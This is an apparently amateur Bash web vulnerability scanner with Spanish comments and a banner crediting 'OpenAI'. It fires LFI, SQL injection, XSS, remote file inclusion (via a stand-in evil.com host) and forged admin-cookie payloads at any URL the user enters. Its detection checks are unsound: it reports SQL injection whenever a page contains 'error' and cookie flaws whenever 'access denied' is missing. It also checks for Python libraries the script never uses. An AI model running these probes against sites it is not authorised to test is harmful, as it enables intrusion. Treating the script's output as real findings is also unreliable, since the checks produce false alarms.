#!/bin/bash

# Función para detectar la vulnerabilidad de LFI (Local File Inclusion)
function detectar_lfi {
    payloads=("../etc/passwd" "../../etc/passwd" "../../../etc/passwd")
    for payload in "${payloads[@]}"; do
        test_url="$1$payload"
        response=$(curl -s "$test_url")
        if [[ "$response" == *"root:"* ]]; then
            echo -e "\033[31m[!] Vulnerabilidad LFI detectada: $test_url\033[0m"
            echo -e "\033[33mDetalles:\033[0m"
            echo -e "\033[33m- Se ha detectado una vulnerabilidad de Local File Inclusion (LFI) en el sitio web."
            echo -e "- Esto podría permitir a un atacante acceder a archivos sensibles del servidor."
            echo -e "- Se recomienda revisar y corregir la configuración del sitio para evitar esta vulnerabilidad.\033[0m"
        fi
    done
}

# Función para detectar la vulnerabilidad de SQLi (SQL Injection)
function detectar_sqli {
    payloads=("' OR '1'='1" "' OR '1'='2")
    for payload in "${payloads[@]}"; do
        test_url="$1$payload"
        response=$(curl -s "$test_url")
        if [[ "$response" == *"error"* ]]; then
            echo -e "\033[31m[!] Vulnerabilidad SQLi detectada: $test_url\033[0m"
            echo -e "\033[33mDetalles:\033[0m"
            echo -e "\033[33m- Se ha detectado una vulnerabilidad de SQL Injection (SQLi) en el sitio web."
            echo -e "- Esto podría permitir a un atacante ejecutar comandos SQL no autorizados en la base de datos."
            echo -e "- Se recomienda utilizar consultas parametrizadas o mecanismos de filtrado de entrada para prevenir esta vulnerabilidad.\033[0m"
        fi
    done
}

# Función para detectar la vulnerabilidad de XSS (Cross-Site Scripting)
function detectar_xss {
    payloads=("<script>alert(\"XSS\")</script>" "<img src=\"x\" onerror=\"alert('XSS')\">")
    for payload in "${payloads[@]}"; do
        test_url="$1$payload"
        response=$(curl -s "$test_url")
        if [[ "$response" == *"$payload"* ]]; then
            echo -e "\033[31m[!] Vulnerabilidad XSS detectada: $test_url\033[0m"
            echo -e "\033[33mDetalles:\033[0m"
            echo -e "\033[33m- Se ha detectado una vulnerabilidad de Cross-Site Scripting (XSS) en el sitio web."
            echo -e "- Esto podría permitir a un atacante inyectar y ejecutar código malicioso en el navegador de los usuarios."
            echo -e "- Se recomienda implementar medidas de validación y escape de datos para prevenir esta vulnerabilidad.\033[0m"
        fi
    done
}

# Función para detectar la vulnerabilidad de RFI (Remote File Inclusion)
function detectar_rfi {
    payloads=("http://www.evil.com/malicious_script")
    for payload in "${payloads[@]}"; do
        test_url="$1$payload"
        response=$(curl -s "$test_url")
        if [[ "$response" == *"evil_content"* ]]; then
            echo -e "\033[31m[!] Vulnerabilidad RFI detectada: $test_url\033[0m"
            echo -e "\033[33mDetalles:\033[0m"
            echo -e "\033[33m- Se ha detectado una vulnerabilidad de Remote File Inclusion (RFI) en el sitio web."
            echo -e "- Esto podría permitir a un atacante incluir archivos remotos maliciosos en el sitio."
            echo -e "- Se recomienda validar y filtrar adecuadamente las entradas para evitar esta vulnerabilidad.\033[0m"
        fi
    done
}

# Función para detectar la vulnerabilidad de manipulación de cookies (Cookie Manipulation)
function detectar_cookie_manipulation {
    response=$(curl -s -b "admin=true;user=admin" "$1")
    if [[ "$response" != *"access denied"* ]]; then
        echo -e "\033[31m[!] Vulnerabilidad de manipulación de cookies detectada: $1\033[0m"
        echo -e "\033[33mDetalles:\033[0m"
        echo -e "\033[33m- Se ha detectado una vulnerabilidad de manipulación de cookies en el sitio web."
        echo -e "- Esto podría permitir a un atacante obtener acceso no autorizado o realizar acciones en nombre del usuario legítimo."
        echo -e "- Se recomienda revisar y fortalecer las políticas de seguridad relacionadas con las cookies.\033[0m"
    fi
}

# Función para obtener la IP del usuario
function obtener_ip {
    ip_address=$(curl -s https://api.ipify.org)
    echo "Tu dirección IP es: $ip_address"
}

# Función para comprobar la instalación de las librerías necesarias
function comprobar_librerias {
    librerias=("argparse" "requests" "colorama" "tqdm")
    librerias_faltantes=()
    for libreria in "${librerias[@]}"; do
        if ! python -c "import $libreria" &> /dev/null; then
            librerias_faltantes+=("$libreria")
        fi
    done
    if [[ ${#librerias_faltantes[@]} -gt 0 ]]; then
        echo -e "\033[33mAdvertencia: Faltan las siguientes librerías requeridas:\033[0m"
        for libreria in "${librerias_faltantes[@]}"; do
            echo -e "\033[33m- $libreria\033[0m"
        done
    else
        echo -e "\033[32mTodas las librerías requeridas están instaladas.\033[0m"
    fi
}

# Función principal del programa
function main {
    echo -e "\033[34m _____     _                 __        __    _           "
    echo -e "|  ___|   | |                \ \      / /   | |          "
    echo -e "| |__  ___| |_ _ __ ___   __ _\ \    / /__ _| |__   ___  "
    echo -e "|  __|/ _ \ __| '_ \` _ \ / _\` |\ \  / / _\` | '_ \ / _ \ "
    echo -e "| |___  __/ |_| | | | | | (_| |\ \/ / (_| | |_) |  __/ "
    echo -e "\____/\___|\__|_| |_| |_|\__,_| \__/ \__,_|_.__/ \___| "
    echo -e "\033[34mby OpenAI\033[0m"

    # Solicitar la URL al usuario
    read -p "Introduce el sitio web que deseas escanear: " url

    # Escaneo de vulnerabilidades
    detectar_lfi "$url"
    detectar_sqli "$url"
    detectar_xss "$url"
    detectar_rfi "$url"
    detectar_cookie_manipulation "$url"

    # Obtener la IP del usuario
    obtener_ip

    # Comprobar las librerías necesarias
    comprobar_librerias
}

# Ejecutar la función principal
main
